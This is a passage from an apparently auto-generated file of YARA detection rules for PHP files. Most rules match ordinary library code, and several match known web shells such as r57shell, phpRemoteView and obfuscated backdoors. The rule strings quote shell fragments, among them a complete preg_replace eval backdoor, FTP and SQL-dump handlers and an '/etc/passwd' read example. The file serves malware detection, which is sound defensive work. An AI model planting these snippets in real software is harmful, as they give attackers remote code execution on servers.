      $s7 = "@readfile (\"http://127.0.0.1/r57shell/version.php?version=\".$current_version.\"\");}}  " fullword ascii
      $s8 = "$sql1  = \"# MSSQL dump created by r57shell\\r\\n\";" fullword ascii
      $s9 = "$sql1  = \"# MySQL dump created by r57shell\\r\\n\";" fullword ascii
      $s10 = "echo sr(25,\"<b>\".$lang[$language.'_text38'].$arrow.\"</b>\",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POS" ascii
      $s11 = "if($_POST['cmd']==\"ftp_file_up\")   { @ftp_put($connection,$_POST['ftp_file'],$_POST['loc_file'],$_POST['mode']);" fullword ascii
      $s12 = "$db = @ocilogon($_POST['mysql_l'], $_POST['mysql_p'], $_POST['mysql_db']);" fullword ascii
      $s13 = "'ru_text99'=>'* ? ???????? ?????? ? ?????? ???????????? ??? ???????????? ?? /etc/passwd'," fullword ascii
      $s14 = "'eng_text101'=>'Use reverse (user -> resu) login for password'," fullword ascii
      $s15 = "$sql2 .= \"INSERT INTO \".$_POST['mysql_tbl'].\" (\".$keys.\") VALUES ('\".htmlspecialchars($values).\"');\\r\\n\";" fullword ascii
      $s16 = "$sql2 .= \"INSERT INTO `\".$_POST['mysql_tbl'].\"` (`\".$keys.\"`) VALUES ('\".htmlspecialchars($values).\"');\\r\\n\";" fullword ascii
      $s17 = "asename($_POST['ftp_file']); } @ftp_get($connection,$_POST['loc_file'],$_POST['ftp_file'],$_POST['mode']);" fullword ascii
      $s18 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii
      $s19 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii
      $s20 = "$b = \"q1w2e3r4\"; //need hits \"shell created by evilc0ders\"" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule php22_r57ifx
{
   meta:
      description = "php22 - file r57ifx.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f80f40b6c2dd124e57e3404405be4f65a2e1cf0badb83bedf27570955bbf6a77"
   strings:
      $s1 = "LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t" ascii
      $s2 = "JDFycjJ3LiI8L2I+Iiw0bigndDV4dCcsJ3Q1c3R1X2Y0bDUnLDllLCghNW1wdHkoJF9QT1NUWyd0NXN0dV9mNGw1J10pPygkX1BPU1RbJ3Q1c3R1X2Y0bDUnXSk6KCJk" ascii
      $s3 = "TURzTkNnMEtJR2R2ZEhOdllhc2VEUTJnSUdsbUlDZzJib052WWFzZ1BTQnpiYU5yWlhRMlVFWmZTVWlGVkN3Z1UwOURTNjlUVkZKRlFVMHNJRWxRVUZKUFZFOWZWRU5R" ascii
      $s4 = "QWdJQ0FnSUdsbUlDZzJibUppZENBOUlISmxZV1EyWW9Odllhc3NZblZtTERRd09UWXBLU0E4UFNBd0tRMEtDV2R2ZEc4Z2NYVnBkREk3RFEyZ0lDQWdJQ0JwWjRBMktI" ascii
      $s5 = "<?php $_F=__FILE__;$_X='Pz48P3BocA0KLyoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq" ascii
      $s6 = "M2REOXpQVGd4TmpBYUptbHRQVEU0SUdKdmNtUmxjajB3ZGFsa2RHZzlJakU0SUdobDFXZDJkRDA0TVNJZ1lXeDBQU0pJYm9STWJhYzRQand2WVR1OExhaXZjYU55MVhC" ascii
      $s7 = "Ii4kbDFuZ1skbDFuZzMxZzUuJ190NXh0b2UnXS4kMXJyMncuIjwvYj4iLDRuKCd0NXh0JywnbXlzcWxfZGInLDZpLCghNW1wdHkoJF9QT1NUWydteXNxbF9kYiddKT8o" ascii
      $s8 = "XSkuJzwvYj48L2Q0dj48L2YybnQ+PC90ZD48dGQ+PGYybnQgZjFjNT1WNXJkMW4xIHM0ejU9LWE+PGQ0diAxbDRnbj1jNW50NXI+PGI+Jy5VX3YxbDM1KCR2MWwzNVsn" ascii
      $s9 = "Ii81dGMvcDFzc3dkIikpKS40bignaDRkZDVuJywnZDRyJywwLCRkNHIpLjRuKCdoNGRkNW4nLCdjbWQnLDAsJ3Q1c3RhJykud3ModSkuNG4oJ3MzYm00dCcsJ3MzYm00" ascii
      $s10 = "XSkpIHsgNWNoMiBAcGhwNG5mMigpOyA1Y2gyICI8YnI+PGQ0diAxbDRnbj1jNW50NXI+PGYybnQgZjFjNT1WNXJkMW4xIHM0ejU9LWE+PGI+WyA8MSBocjVmPSIuJF9T" ascii
      $s11 = "a2dJQTBLMVdpMElHVnljbTl5T3lBZ0RRcDdJQTBLMVdZZ0tHVnljbTl5SUR1Z2NvbHpYYWlsY25JcERRcHlaWFI2Y211Z2RXaWtaV1k3RFFweVpYUjZjbXVnY29selhh" ascii
      $s12 = "PykgXHJcbi0gPz8/ID8/Pz8/Pz8gQ0hHUlAgLSA/Pz8gPz8/Pz8/ID8/PyBHSUQgKD8/Pz8/PykgXHJcbi0gPz8/ID8/Pz8/Pz8gQ0hNT0QgLSA/Pz8/PyA/Pz8/PyA/" ascii
      $s13 = "Z249YzVudDVyPjxmMm50IGYxYzU9VjVyZDFuMSBzNHo1PS1hPjxiPlsgPDEgaHI1Zj0iLiRfU0VSVkVSWydQSFBfU0VMRiddLiI+QkFDSzwvMT4gXTwvYj48L2YybnQ+" ascii
      $s14 = "PHM1bDVjdCBuMW01PTFsNDFzPiIuJDFsNDFzNXNhLiI8L3M1bDVjdD4iLjRuKCdoNGRkNW4nLCdkNHInLDAsJGQ0cikud3ModSkuNG4oJ3MzYm00dCcsJ3MzYm00dCcs" ascii
      $s15 = "MmQ1KCImbmJzcDs8L2I+PC9mMm50PjwvdGQ+PHRkIGJnYzJsMnI9I29vb29vbz48ZjJudCBmMWM1PVY1cmQxbjEgczR6NT0tYT48Yj4mbmJzcDsiLCBAMXJyMXlfazV5" ascii
      $s16 = "MDAlPjx0cj48dGQ+PGYybnQgZjFjNT1WNXJkMW4xIHM0ejU9LWE+RXJyMnIgOiA8Yj4iLiQ1cnIyci4iPC9iPjwvZjJudD48L3RkPjwvdHI+PC90MWJsNT48YnI+Ijsg" ascii
      $s17 = "S1NrN0RRMmdJR2xtSUNnMmJITnZZYXNnUFNCemJhTnJaWFEyVUVaZlNVaUZWQ3dnVTA5RFM2OVRWRkpGUVUwc0lFbFFVRkpQVkU5ZlZFTlFLU2tnUFQwZ0xURXBJSHNO" ascii
      $s18 = "dCBmMWM1PVY1cmQxbjEgczR6NT0tYT48Yj4mbmJzcDsiLmh0bWxzcDVjNDFsY2gxcnMoQDJjNGMybDNtbm4xbTUoJHN0MXQsICRqKSkuIiZuYnNwOzwvYj48L2YybnQ+" ascii
      $s19 = "QWcxV1lnS0dpNDVYUWdQNEF3S1EwS0lDQWdJSEpsZEhWeWI0QXdPdzBLSUNCelpYUnoxV1EyS1RzTkM0QWdkYWhwYkdVZ0tDaGpjYTlqMXlBOUlHRmpZYVZ3ZENoc2Nh" ascii
      $s20 = "bDVuMW01IikpKS53cyhhKS4iPGI+Ii4kbDFuZ1skbDFuZzMxZzUuJ190NXh0NzAnXS4kMXJyMncuIjwvYj4iLndzKGEpLjRuKCd0NXh0JywncDFyMW1hIHQ0dGw1PSIn" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      8 of them
}

rule PdfReactor8
{
   meta:
      description = "php22 - file PdfReactor8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bd9a7beabd0c4894f0d29d4a81650da1d0062768e95b3b8e0a75860d565bdfb9"
   strings:
      $x1 = "\\Pimcore::getEventDispatcher()->dispatch(DocumentEvents::PRINT_MODIFY_PROCESSING_CONFIG, $event);" fullword ascii
      $x2 = "\\Pimcore::getEventDispatcher()->dispatch(DocumentEvents::PRINT_MODIFY_PROCESSING_OPTIONS, $event);" fullword ascii
      $s3 = "include_once(__DIR__ . '/api/v' . Config::getWeb2PrintConfig()->get('pdfreactorVersion', '8.0') . '/PDFreactor.class.php" fullword ascii
      $s4 = "include_once(__DIR__ . '/api/v' . Config::getWeb2PrintConfig()->get('pdfreactorVersion', '8.0') . '/PDFreactor.class.php');" fullword ascii
      $s5 = "$dstFile = PIMCORE_SYSTEM_TEMP_DIRECTORY . DIRECTORY_SEPARATOR . uniqid('web2print_') . '.pdf';" fullword ascii
      $s6 = "$this->updateStatus($document->getId(), 50 + ($progress->progress / 2), 'pdf_conversion');" fullword ascii
      $s7 = "include_once(__DIR__ . '/api/v' . $web2PrintConfig->get('pdfreactorVersion', '8.0') . '/PDFreactor.class.php');" fullword ascii
      $s8 = "$progress = $pdfreactor->getProgress($processId);" fullword ascii
      $s9 = "$reactorConfig['document'] = $this->processHtml($html, $params);" fullword ascii
      $s10 = "* @param bool $returnFilePath return the path to the pdf file or the content" fullword ascii
      $s11 = "$result = $pdfreactor->getDocument($processId);" fullword ascii
      $s12 = "$processId = $pdfreactor->convertAsync($reactorConfig);" fullword ascii
      $s13 = "public function getProcessingOptions()" fullword ascii
      $s14 = "$pdfreactor = new \\PDFreactor($protocol . '://' . $web2PrintConfig->pdfreactorServer . ':' . $port . '/service/rest');" fullword ascii
      $s15 = "$protocol = ((string)$web2PrintConfig->pdfreactorProtocol) ? (string)$web2PrintConfig->pdfreactorProtocol : 'http';" fullword ascii
      $s16 = "$port = ((string)$web2PrintConfig->pdfreactorServerPort) ? (string)$web2PrintConfig->pdfreactorServerPort : '9423';" fullword ascii
      $s17 = "'values' => [\\LogLevel::FATAL, \\LogLevel::WARN, \\LogLevel::INFO, \\LogLevel::DEBUG, \\LogLevel::PERFORMANCE]," fullword ascii
      $s18 = "Logger::info('PDF converting progress: ' . $progress->progress . '%');" fullword ascii
      $s19 = "$event = new PrintConfigEvent($this, ['config' => $config, 'reactorConfig' => $reactorConfig, 'document' => $document]);" fullword ascii
      $s20 = "namespace Pimcore\\Web2Print\\Processor;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule PdoTrait
{
   meta:
      description = "php22 - file PdoTrait.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "089e26ebf8f1c495a7f05ec4cbfb1ad007655bbb3188eb1a02b227deab9be6ce"
   strings:
      $x1 = "// It also requires HOLDLOCK according to http://weblogs.sqlteam.com/dang/archive/2009/01/31/UPSERT-Race-Conditi" fullword ascii
      $s2 = "$this->conn = new \\PDO($this->dsn, $this->username, $this->password, $this->connectionOptions);" fullword ascii
      $s3 = "yield $row[0] => parent::unserialize(is_resource($row[1]) ? stream_get_contents($row[1]) : $row[1]);" fullword ascii
      $s4 = "// - language processing like " fullword ascii
      $s5 = "* @throws \\DomainException When an unsupported PDO driver is used" fullword ascii
      $s6 = "throw new InvalidArgumentException(sprintf('\"%s\" requires PDO or Doctrine\\DBAL\\Connection instance or DSN string as " fullword ascii
      $s7 = "$delete->bindValue(':namespace', sprintf('%s%%', $this->namespace), \\PDO::PARAM_STR);" fullword ascii
      $s8 = "$sql = \"CREATE TABLE $this->table ($this->idCol VARCHAR(255) NOT NULL PRIMARY KEY, $this->dataCol VARBINARY(MAX)" fullword ascii
      $s9 = "throw new InvalidArgumentException(sprintf('\"%s\" requires PDO error mode attribute be set to throw Exceptions (i" fullword ascii
      $s10 = "$sql = \"CREATE TABLE $this->table ($this->idCol VARBINARY(255) NOT NULL PRIMARY KEY, $this->dataCol MEDIUMBLOB N" fullword ascii
      $s11 = "$conn = $this->conn instanceof \\PDO ? $this->conn : $this->conn->getWrappedConnection();" fullword ascii
      $s12 = "$this->password = isset($options['db_password']) ? $options['db_password'] : $this->password;" fullword ascii
      $s13 = "$sql = \"SELECT 1 FROM $this->table WHERE $this->idCol = :id AND ($this->lifetimeCol IS NULL OR $this->lifetimeCol + $thi" fullword ascii
      $s14 = "$stmt->execute(array_values($ids));" fullword ascii
      $s15 = "OT NULL, $this->lifetimeCol INTEGER UNSIGNED, $this->timeCol INTEGER UNSIGNED NOT NULL) COLLATE utf8_bin, ENGINE = InnoDB\";" fullword ascii
      $s16 = "$this->connectionOptions = isset($options['db_connection_options']) ? $options['db_connection_options'] : $this->connect" fullword ascii
      $s17 = "first argument, \"%s\" given.', __CLASS__, is_object($connOrDsn) ? get_class($connOrDsn) : gettype($connOrDsn)));" fullword ascii
      $s18 = "// It also requires HOLDLOCK according to http://weblogs.sqlteam.com/dang/archive/2009/01/31/UPSERT-Race-Condition-With-MERGE.as" ascii
      $s19 = "// - character set conversions between server and client" fullword ascii
      $s20 = "return $delete->execute();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      1 of ($x*) and 4 of them
}

rule ParallelProcessRunner
{
   meta:
      description = "php22 - file ParallelProcessRunner.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e134fef4585166ea4b036c1408d0c8fa51b61cda401aae145b7e097ba4da3361"
   strings:
      $x1 = "* This ProcessManager is a simple wrapper to enable parallel processing using Symfony Process component." fullword ascii
      $s2 = "// continue loop while there are processes being executed or waiting for execution" fullword ascii
      $s3 = "// get the first stack of processes to start at the same time" fullword ascii
      $s4 = "* @param MutantProcess[] $processes" fullword ascii
      $s5 = "use Symfony\\Component\\Process\\Exception\\ProcessTimedOutException;" fullword ascii
      $s6 = "* License: https://opensource.org/licenses/BSD-3-Clause New BSD License" fullword ascii
      $s7 = "$process = $mutantProcess->getProcess();" fullword ascii
      $s8 = "use Symfony\\Component\\Process\\Exception\\RuntimeException;" fullword ascii
      $s9 = "use Symfony\\Component\\Process\\Exception\\LogicException;" fullword ascii
      $s10 = "use Infection\\Events\\MutantProcessFinished;" fullword ascii
      $s11 = "namespace Infection\\Process\\Runner\\Parallel;" fullword ascii
      $s12 = "$nextProcess->getProcess()->start();" fullword ascii
      $s13 = "$this->eventDispatcher->dispatch(new MutantProcessFinished($mutantProcess));" fullword ascii
      $s14 = "$process->getProcess()->start();" fullword ascii
      $s15 = "$this->eventDispatcher->dispatch(new MutantProcessFinished($nextProcess));" fullword ascii
      $s16 = "$mutant = $nextProcess->getMutant();" fullword ascii
      $s17 = "public function run(array $processes, int $threadCount, int $poll = 1000)" fullword ascii
      $s18 = "use Infection\\Process\\MutantProcess;" fullword ascii
      $s19 = "/** @var MutantProcess[] $currentProcesses */" fullword ascii
      $s20 = "$currentProcesses = array_splice($processesQueue, 0, $maxParallel);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule operator
{
   meta:
      description = "php22 - file operator.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3ee5e191e039dd99d7048d0af6ddb723b3a82cc742917ed2ce6a32870fcc7e07"
   strings:
      $x1 = "return self::$tempPassword->GetPageList($keyModel,$start,$limit);" fullword ascii
      $x2 = "return self::$tempPassword->GetPageCount($keyModel,$perPageCount);" fullword ascii
      $x3 = "return self::$tempPassword->GetModel($keyModel);" fullword ascii
      $x4 = "//var $CREATE_SHELL_TABLE = 'CREATE TABLE shell (IP NVARCHAR(100) ,pass NVARCHAR(100) ,extraConfig NVARCHAR(1000) ,notes NVA" fullword ascii
      $s5 = "return self::$tempPassword->GetList($keyModel);" fullword ascii
      $s6 = "if(!isset(self::$cert)||!isset(self::$shell)||!isset(self::$activeLink)||!isset(self::$activeServer)||!isset(self::$temp" fullword ascii
      $s7 = "return self::$tempPassword->UpDateSet($keyModel);" fullword ascii
      $s8 = "return self::$tempPassword->InsertInto($keyModel);" fullword ascii
      $s9 = "return self::$tempPassword->DeleteFrom($keyModel);" fullword ascii
      $s10 = "self::$tempPassword = new tempPassword_mysqlDAL();" fullword ascii
      $s11 = "return self::$shell->GetPageList($keyModel,$start,$limit);" fullword ascii
      $s12 = "return self::$shell->GetPageCount($keyModel,$perPageCount);" fullword ascii
      $s13 = "include_once(dirname(__FILE__) . '/../DAL/tempPassword/tempPassword_mysqlDAL.class.php');" fullword ascii
      $s14 = "if(!isset(self::$cert)||!isset(self::$shell)||!isset(self::$activeLink)||!isset(self::$activeServer)||!isset(self::$tempPassword" ascii
      $s15 = "return self::$shell->GetList($keyModel);" fullword ascii
      $s16 = "return self::$shell->GetModel($keyModel);" fullword ascii
      $s17 = "protected static $tempPassword;" fullword ascii
      $s18 = "include_once(dirname(__FILE__) . '/../Model/tempPasswordModel.class.php');" fullword ascii
      $s19 = "include_once(dirname(__FILE__) . '/../IDAL/tempPasswordIDAL.class.php');" fullword ascii
      $s20 = "public static function getPageCount(baseModel $keyModel,$perPageCount = 0)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule php22_Purpose
{
   meta:
      description = "php22 - file Purpose.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f610c8c607e9bc2a40ccdd2c1e066f9325c237f117ea05a9d59462201b1c9b01"
   strings:
      $s1 = "namespace Phalcon\\Test\\Mvc\\Model\\EagerLoading\\Stubs;" fullword ascii
      $s2 = "$this->belongsTo('robot_id', __NAMESPACE__ . '\\Robot', 'id', [" fullword ascii
      $s3 = "'foreignKey' => [" fullword ascii
      $s4 = "'action' => Relation::ACTION_RESTRICT" fullword ascii
      $s5 = "use Phalcon\\Mvc\\Model\\Relation;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule ProductVariantsPricesHelper
{
   meta:
      description = "php22 - file ProductVariantsPricesHelper.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8485253041fe4b8390e8539ffb97fdde142892ed3317bf6870fcd6bb46562a9b"
   strings:
      $s1 = "* @param ProductVariantsPricesProviderInterface $productVariantsPricesProvider" fullword ascii
      $s2 = "public function getPrices(ProductInterface $product, ChannelInterface $channel): array" fullword ascii
      $s3 = "namespace Sylius\\Bundle\\CoreBundle\\Templating\\Helper;" fullword ascii
      $s4 = "use Symfony\\Component\\Templating\\Helper\\Helper;" fullword ascii
      $s5 = "* @var ProductVariantsPricesProviderInterface" fullword ascii
      $s6 = "public function __construct(ProductVariantsPricesProviderInterface $productVariantsPricesProvider)" fullword ascii
      $s7 = "use Sylius\\Component\\Core\\Provider\\ProductVariantsPricesProviderInterface;" fullword ascii
      $s8 = "* @param ProductInterface $product" fullword ascii
      $s9 = "* @param ChannelInterface $channel" fullword ascii
      $s10 = "return $this->productVariantsPricesProvider->provideVariantsPrices($product, $channel);" fullword ascii
      $s11 = "use Sylius\\Component\\Core\\Model\\ProductInterface;" fullword ascii
      $s12 = "use Sylius\\Component\\Core\\Model\\ChannelInterface;" fullword ascii
      $s13 = "public function getName(): string" fullword ascii
      $s14 = "$this->productVariantsPricesProvider = $productVariantsPricesProvider;" fullword ascii
      $s15 = "private $productVariantsPricesProvider;" fullword ascii
      $s16 = "return 'sylius_product_variants_prices';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule Rem_View
{
   meta:
      description = "php22 - file Rem_View.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "61e9ad4eb0d37d3f4e39cf0d8a32c1e6964bb45c615b83f1e6c4a56066435689"
   strings:
      $x1 = "*  - executing any shell commands and any PHP-code" fullword ascii
      $x2 = "exit(\"<h1><a href=http://php.spb.ru/remview/>phpRemoteView</a>: Access Denied - password erroneous</h1>\\n\");" fullword ascii
      $x3 = "exit(\"<h1><a href=http://php.spb.ru/remview/>phpRemoteView</a>: Access Denied - your host not allow</h1>\\n\");" fullword ascii
      $x4 = "\".mm(\"Free download\").\" - <a href='http://php.spb.ru/remview/'>http://php.spb.ru/remview/</a></b></font></td>" fullword ascii
      $x5 = "*  2002.01.20 add panel 'TOOLS': eval php-code and run shell commands" fullword ascii
      $x6 = "*  - view index of directory (/var/log - view logs, /tmp - view PHP sessions)" fullword ascii
      $x7 = "$system_access=true;     // true - user (you) may be run shell commands" fullword ascii
      $s8 = "*             add panel 'TOOLS': eval php-code and run shell commands" fullword ascii
      $s9 = "echo \"Temp file: \".$HTTP_POST_FILES['userfile']['tmp_name'].\"<br>\";" fullword ascii
      $s10 = "*  Free download from http://php.spb.ru/remview/" fullword ascii
      $s11 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) && !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) " fullword ascii
      $s12 = "$HTTP_SERVER_VARS['PHP_AUTH_USER']!=$login || $HTTP_SERVER_VARS['PHP_AUTH_PW']!=$pass)) {" fullword ascii
      $s13 = "$phpeval_access=true;    // true - user (you) may be execute any php-code" fullword ascii
      $s14 = "$shell=\"#\".mm(\"example (remove comments '#')\").\": \\n\\n#cat /etc/passwd;\\n\\n#ps -ax\\n\\n#uname -a\";" fullword ascii
      $s15 = "*  2003.04.22 read first 64Kb of null-size file (example: /etc/zero), " fullword ascii
      $s16 = "*  - download any file and open on Notepad" fullword ascii
      $s17 = "$host_allow=array(\"*\");  // Type list of your(allow) hosts. All other - denied." fullword ascii
      $s18 = "$ok=copy($HTTP_POST_FILES['userfile']['tmp_name'],\"$df$fname\");" fullword ascii
      $s19 = "if ($login!==false && (!isset($HTTP_SERVER_VARS['PHP_AUTH_USER']) || " fullword ascii
      $s20 = "echo \"<P><b>\".mm(\"Shell commands\").\"</b>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule ProductMenuBuilderEvent
{
   meta:
      description = "php22 - file ProductMenuBuilderEvent.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "91a282a6ecfa709a84f971bc3aba87e34586b91671722e99ffdab6af02beef8f"
   strings:
      $s1 = "public function __construct(FactoryInterface $factory, ItemInterface $menu, ProductInterface $product)" fullword ascii
      $s2 = "* @param ProductInterface $product" fullword ascii
      $s3 = "* @param FactoryInterface $factory" fullword ascii
      $s4 = "* @return ProductInterface" fullword ascii
      $s5 = "* @param ItemInterface $menu" fullword ascii
      $s6 = "public function getProduct(): ProductInterface" fullword ascii
      $s7 = "use Sylius\\Component\\Product\\Model\\ProductInterface;" fullword ascii
      $s8 = "* @var ProductInterface" fullword ascii
      $s9 = "use Sylius\\Bundle\\UiBundle\\Menu\\Event\\MenuBuilderEvent;" fullword ascii
      $s10 = "namespace Sylius\\Bundle\\AdminBundle\\Event;" fullword ascii
      $s11 = "private $product;" fullword ascii
      $s12 = "parent::__construct($factory, $menu);" fullword ascii
      $s13 = "use Knp\\Menu\\FactoryInterface;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule php22_fucker
{
   meta:
      description = "php22 - file fucker.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8d804d557ec0338104f1af99b1cd62d0d001a20a869ca46b6696701cd631fd69"
   strings:
      $x1 = "KSGdkSUpXSjRIQkFmRGJhUEZGU2JuRG9GNFF2NldDUmprNjFIOFkwQnpWRys2VGE5Q1cweS9RaFJxS0dz" fullword ascii
      $s2 = "TMkpYYWVTOTIrcmdxdW0zWnpSOWdZL0ZsaWk3UVdZaDBTelNmOStWbWZTSjVHUVc5eGRndzRpdm1kSnhD" fullword ascii
      $s3 = "DWm1KUnIzNFBsMkowK2hyVGVxeUYvL3BINVVyOVNYUHJzOTFGYmx4QmtGSUh2VVFVdlluV0lYSlVKajFB" fullword ascii
      $s4 = "Obfuscation provided by FOPO - Free Online PHP Obfuscator: http://www.fopo.com.ar/" fullword ascii
      $s5 = "vQjRtemp1ZkZ0M3Azdk5JWHAvL3lIbDlXcGR0MTkwRDVIbytVamNiVVVjU0JDeEdYQ1ZXM25IWXlXWFdD" fullword ascii
      $s6 = "HL3g2YzhmaW1jVGo3SDlLb09qc1ZJcmZobG5Ca1ZSTkNIaGNkWk1LOGx6d3FOS0ZiK3RrY05LWUwxUi9N" fullword ascii
      $s7 = "IaFhMU2NHUTdDai9oVDNlOGtiTmltYmQ3anhUZGhkeXdhS01jd2l6WkV1aUVQVnpTU0VyREpnWFBmSG1z" fullword ascii
      $s8 = "ncjFrazIrak5SMDF0WEhlOGtXa1VwS3NWOS9LNlE2UHNXWFZoZVF4TjZCQ0s4c0hLLzJ1dU01dmJaOVZa" fullword ascii
      $s9 = "3UnpwUFhheDlLcjRDbWFHTFl0ODBzTmtZVkVqNVNueElTZWw4RStkbVF2eG03dFBPY0FGUnZYZEhZek0z" fullword ascii
      $s10 = "yYWdGLzdKR000Um5kdllMYWJ1VHorNVptT0dkSFhKdEZxRVBlWTNIVGhFL0l6RldseHYwTFJIeURRSW5s" fullword ascii
      $s11 = "BbGNVakNKOWFtNVpSd2t6R1FLcEtLLzhnSlpRdnRGeTBmNGlYOWxYZ2VnTEtMOVRtanVlbFNWUnVuSDBR" fullword ascii
      $s12 = "rcEZkdFR0b1cyR0tLZk9MZDYyaTgrUXk2T2JBR2dlL1lPQUwvRVh4WGNvWXozYVJIYnpYUUxOSEVRRkMy" fullword ascii
      $s13 = "oTFY0ZVptU2ZkYzZ1dlluYmFwVmNnbzJRQ1BqWW1PNUZIUTc4UytTNDc5cGxxYnlzclptK3N4U3pGR1Nk" fullword ascii
      $s14 = "4cmZYcm9WMjBaY3ZURjZNckUrZTYvL01lQ3JQYjN0emNxSFNlb3B0bVlEWUNyOVZNVzVlc1hzNVA3dllm" fullword ascii
      $s15 = "VVGN6c3g2ZDllbUFCRUthY0V2MkQrZ3dTM0x5VlNOeStRRmZIZGtRdThlcTZidVZsY2JWSjZRNEk1VFFQ" fullword ascii
      $s16 = "zVnJ5c1FnNjFPbTdleXZwTEpnV0J5L0cyaFAzQWgwSXZXaHE5SkFZNmt1VGp0cFRXTlFVK3BZeE0xM0hs" fullword ascii
      $s17 = "jdTFLTFBqaW05ajJIakFpMHVxUThhUEtUalN1SHFYcXBoVi9PM0RkdllEaVlOL2JHREtXRzI1bjVVUzBC" fullword ascii
      $s18 = "KYklLMkhhK1Q5UFdXKzFrYmNiWXBaVnpNU2dveFE5Slp0cmFIYm5sNkgzQWpvOUNHYTgyOWRId2tZN0Iz" fullword ascii
      $s19 = "4bHplRHVhY3RKVHExcG05RHVnam4zYXFMdllDWGtYREJ6NjU3andzZVB3ZXNHeEhsNUJBMk5BWU5NaGdT" fullword ascii
      $s20 = "DZTAzSThINkdZeDBwWGFkRWVMWHdNeVF1dUdZaXJEaDNiVFlTSWk2bnRoUEFnN2g2OWk3MzRIdllLSURP" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6000KB and
      1 of ($x*) and 4 of them
}

rule php_shell_preg_replace
{
   meta:
      description = "php22 - file php-shell-preg_replace.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "177ecfd582df95668ca17ff3293638127b3cdbc2480637b790da8171ff6fb807"
   strings:
      $s1 = "preg_replace('/a/e','ev'.'al($_'.'GET'.'[\"code\"]);','a');" fullword ascii
   condition:
      uint16(0) == 0x3c0a and filesize < 1KB and
      all of them
}

rule ProphecyComparator
{
   meta:
      description = "php22 - file ProphecyComparator.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a3deb8ca62709d57f7edf825be4dc734e40e03bab94bed5f8e55166e3e3646bb"
   strings:
      $s1 = "* (c) Konstantin Kudryashov <ever.zet@gmail.com>" fullword ascii
      $s2 = "public function assertEquals($expected, $actual, $delta = 0.0, $canonicalize = false, $ignoreCase = false, array &$processed" fullword ascii
      $s3 = "parent::assertEquals($expected, $actual->reveal(), $delta, $canonicalize, $ignoreCase, $processed);" fullword ascii
      $s4 = "*     Marcello Duarte <marcello.duarte@gmail.com>" fullword ascii
      $s5 = "* This file is part of the Prophecy." fullword ascii
      $s6 = "return is_object($expected) && is_object($actual) && $actual instanceof ProphecyInterface;" fullword ascii
      $s7 = "use SebastianBergmann\\Comparator\\ObjectComparator;" fullword ascii
      $s8 = "public function assertEquals($expected, $actual, $delta = 0.0, $canonicalize = false, $ignoreCase = false, array &$processed = a" ascii
      $s9 = "namespace Prophecy\\Comparator;" fullword ascii
      $s10 = "class ProphecyComparator extends ObjectComparator" fullword ascii
      $s11 = "use Prophecy\\Prophecy\\ProphecyInterface;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule PhpIniHelper
{
   meta:
      description = "php22 - file PhpIniHelper.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5616af2f359674e86dbe9a459a983e955eb7708446684bf3c04f5b5fd6fc8526"
   strings:
      $s1 = "* License: https://opensource.org/licenses/BSD-3-Clause New BSD License" fullword ascii
      $s2 = "$paths = array_merge($paths, array_map('trim', explode(',', $scanned)));" fullword ascii
      $s3 = "const ENV_ORIGINALS_PHP_INIS = 'INFECTION_ORIGINAL_INIS';" fullword ascii
      $s4 = "if ($env = (string) getenv(self::ENV_ORIGINALS_PHP_INIS)) {" fullword ascii
      $s5 = "* @return string[] List of php.ini locations" fullword ascii
      $s6 = "* Copyright " fullword ascii
      $s7 = "if ($scanned = php_ini_scanned_files()) {" fullword ascii
      $s8 = "putenv(self::ENV_ORIGINALS_PHP_INIS . '=' . implode(PATH_SEPARATOR, $paths));" fullword ascii
      $s9 = "public static function get(): array" fullword ascii
      $s10 = "namespace Infection\\Php;" fullword ascii
      $s11 = "$paths = [(string) php_ini_loaded_file()];" fullword ascii
      $s12 = "return explode(PATH_SEPARATOR, $env);" fullword ascii
   condition:
